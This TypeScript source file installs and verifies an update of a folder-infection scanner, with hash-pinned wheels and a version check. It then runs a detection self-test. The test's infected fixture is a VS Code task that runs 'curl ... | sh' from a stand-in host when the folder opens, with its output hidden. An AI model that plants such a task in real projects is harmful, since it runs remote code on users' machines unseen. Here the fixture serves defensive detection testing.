import * as path from "node:path";

import type { LocateEnv } from "./locate";
import { findPython, type Runner } from "./python";
import type { FolderVerdict } from "../scan/verdict";
import { parseVersion } from "../version";

// Installing an approved saw release beside the one that runs. Every package, saw included, is
// pinned by hash in the lock the channel approved, so neither PyPI nor the machine's pip settings
// can swap one. Only wheels: no build script runs. The new saw must then name its version, find a
// known infection, and find nothing in a plain folder, before anything is switched to it.

/** A folder that opens a shell from a task the moment it is opened: every saw that works calls it infected. */
export const INFECTED_SAMPLE: Record<string, string> = {
  ".vscode/tasks.json": JSON.stringify({
    version: "2.0.0",
    tasks: [{ label: "setup", type: "shell", command: "curl -s https://example.invalid/p.sh | sh", runOptions: { runOn: "folderOpen" }, presentation: { reveal: "never" } }],
  }, null, 2),
};

export const CLEAN_SAMPLE: Record<string, string> = { "README.md": "# notes\n" };

export type UpdateStep = "find-python" | "create-venv" | "install" | "check-version" | "check-detection";

export type UpdateResult =
  | { kind: "installed"; binary: string; dir: string }
  | { kind: "failed"; step: UpdateStep; detail: string };

export interface UpdateDeps {
  env: LocateEnv;
  run: Runner;
  /** Where this version goes; removed again when anything fails. */
  dir: string;
  version: string;
  lock: string;
  writeFile: (file: string, text: string) => void;
  removeDir: (dir: string) => void;
  /** A temporary folder holding `files`, for the detection check. */
  sample: (files: Record<string, string>) => string;
  scan: (binary: string, folder: string) => Promise<FolderVerdict | undefined>;
  onStep?: (step: UpdateStep) => void;
  signal?: AbortSignal;
  stepTimeoutMs?: number;
}

export function sawInVenv(dir: string, platform: NodeJS.Platform): string {
  return platform === "win32" ? path.win32.join(dir, "Scripts", "saw.exe") : path.posix.join(dir, "bin", "saw");
}

function pythonInVenv(dir: string, platform: NodeJS.Platform): string {
  return platform === "win32" ? path.win32.join(dir, "Scripts", "python.exe") : path.posix.join(dir, "bin", "python");
}

class Failed extends Error {
  constructor(readonly step: UpdateStep, readonly detail: string) {
    super(detail);
  }
}

export async function installUpdate(deps: UpdateDeps): Promise<UpdateResult> {
  const timeoutMs = deps.stepTimeoutMs ?? 5 * 60_000;
  const options = { timeoutMs, ...(deps.signal ? { signal: deps.signal } : {}) };
  const run = async (step: UpdateStep, binary: string, args: string[]) => {
    deps.onStep?.(step);
    const result = await deps.run(binary, args, options);
    if (result.cancelled) {
      throw new Failed(step, "cancelled");
    }
    if (result.exitCode !== 0 || result.spawnError || result.timedOut) {
      const said = result.spawnError ?? (result.timedOut ? "timed out" : `${result.stderr}\n${result.stdout}`.trim().split(/\r?\n/).slice(-15).join("\n"));
      throw new Failed(step, said || `status ${result.exitCode}`);
    }
    return result;
  };
  try {
    deps.onStep?.("find-python");
    const python = (await findPython(deps.env, deps.run)).found;
    if (!python) {
      throw new Failed("find-python", "no Python 3.11 or later was found");
    }
    deps.removeDir(deps.dir);
    await run("create-venv", python.executable, ["-m", "venv", deps.dir]);
    const lockFile = path.join(deps.dir, "saw.lock.txt");
    deps.writeFile(lockFile, deps.lock);
    await run("install", pythonInVenv(deps.dir, deps.env.platform), [
      "-m", "pip", "install", "--disable-pip-version-check", "--no-input",
      "--require-hashes", "--no-deps", "--only-binary=:all:", "-r", lockFile,
    ]);
    const binary = sawInVenv(deps.dir, deps.env.platform);
    const said = await run("check-version", binary, ["--version"]);
    const version = parseVersion(said.stdout);
    if (!version || version.join(".") !== deps.version) {
      throw new Failed("check-version", `it says it is ${version ? version.join(".") : "not saw"}, not ${deps.version}`);
    }
    await expect(deps, binary, INFECTED_SAMPLE, "infected");
    await expect(deps, binary, CLEAN_SAMPLE, "clean");
    return { kind: "installed", binary, dir: deps.dir };
  } catch (error) {
    deps.removeDir(deps.dir);
    if (error instanceof Failed) {
      return { kind: "failed", step: error.step, detail: error.detail };
    }
    return { kind: "failed", step: "install", detail: String(error) };
  }
}

async function expect(deps: UpdateDeps, binary: string, files: Record<string, string>, verdict: FolderVerdict): Promise<void> {
  deps.onStep?.("check-detection");
  const folder = deps.sample(files);
  try {
    const found = await deps.scan(binary, folder);
    if (found !== verdict) {
      throw new Failed("check-detection", `it called a ${verdict} sample ${found ?? "unreadable"}`);
    }
  } finally {
    deps.removeDir(folder);
  }
}
